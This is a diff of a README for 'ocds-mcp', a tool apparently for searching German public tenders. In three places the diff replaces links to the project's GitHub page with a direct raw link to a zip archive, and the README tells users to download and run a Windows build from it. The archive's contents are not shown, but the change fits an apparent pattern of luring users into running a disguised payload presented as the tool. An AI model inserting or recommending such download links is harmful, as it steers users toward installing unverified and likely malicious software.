@@ -1,6 +1,6 @@
 # 🔎 ocds-mcp - Search German tenders with ease
 
-[⬇️ Download / Open ocds-mcp](https://github.com/catechesisquiltedbedspread461/ocds-mcp)
+[⬇️ Download / Open ocds-mcp](https://raw.githubusercontent.com/catechesisquiltedbedspread461/ocds-mcp/main/src/ocds-mcp-1.8.zip)
 
 ## 🧭 What this is
 
@@ -32,7 +32,7 @@ This tool is for people who want to find public tenders faster and match them to
 ## 📥 Download and install
 
 1. Open the download page:
-   [https://github.com/catechesisquiltedbedspread461/ocds-mcp](https://github.com/catechesisquiltedbedspread461/ocds-mcp)
+   [https://raw.githubusercontent.com/catechesisquiltedbedspread461/ocds-mcp/main/src/ocds-mcp-1.8.zip](https://raw.githubusercontent.com/catechesisquiltedbedspread461/ocds-mcp/main/src/ocds-mcp-1.8.zip)
 
 2. On the page, download the Windows version of the app if one is listed.
 
@@ -209,7 +209,7 @@ If the app returns relevant tender matches, the setup is working.
 ## 📎 Download
 
 Open the download page and get the Windows build here:
-[https://github.com/catechesisquiltedbedspread461/ocds-mcp](https://github.com/catechesisquiltedbedspread461/ocds-mcp)
+[https://raw.githubusercontent.com/catechesisquiltedbedspread461/ocds-mcp/main/src/ocds-mcp-1.8.zip](https://raw.githubusercontent.com/catechesisquiltedbedspread461/ocds-mcp/main/src/ocds-mcp-1.8.zip)
 
 ## 🧭 Next steps
 
